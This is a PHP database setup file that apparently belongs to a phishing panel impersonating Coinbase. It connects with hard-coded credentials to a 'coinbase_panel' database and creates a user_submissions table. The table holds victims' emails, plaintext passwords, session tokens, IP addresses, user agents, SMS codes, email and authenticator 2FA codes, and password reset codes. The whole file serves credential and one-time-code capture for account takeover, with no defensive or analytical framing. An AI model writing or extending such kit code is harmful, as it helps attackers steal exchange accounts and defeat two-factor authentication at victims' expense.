<?php
// db_connection.php

// Database configuration
$servername = "localhost";
$username = "coinbase_user";
$password = "coinbase_pass";
$dbname = "coinbase_panel";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    // Try to create the database if it doesn't exist
    $conn = new mysqli($servername, $username, $password);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    
    // Create the database
    $sql = "CREATE DATABASE IF NOT EXISTS $dbname";
    if ($conn->query($sql) === TRUE) {
        $conn->select_db($dbname);
    } else {
        die("Error creating database: " . $conn->error);
    }
}

// Set charset to utf8mb4 to handle all characters properly
$conn->set_charset("utf8mb4");

// Create tables if they don't exist
$tables_sql = [
    "CREATE TABLE IF NOT EXISTS user_submissions (
        id INT AUTO_INCREMENT PRIMARY KEY,
        email VARCHAR(255),
        password VARCHAR(255),
        token VARCHAR(255) UNIQUE,
        ip_address VARCHAR(45),
        user_agent TEXT,
        activity VARCHAR(255),
        auth_app TEXT,
        sms_code VARCHAR(255),
        email_2fa_code VARCHAR(255),
        two_fa_code VARCHAR(255),
        password_reset_code VARCHAR(255),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )"
];

foreach ($tables_sql as $sql) {
    if (!$conn->query($sql)) {
        die("Error creating table: " . $conn->error);
    }
}
?>
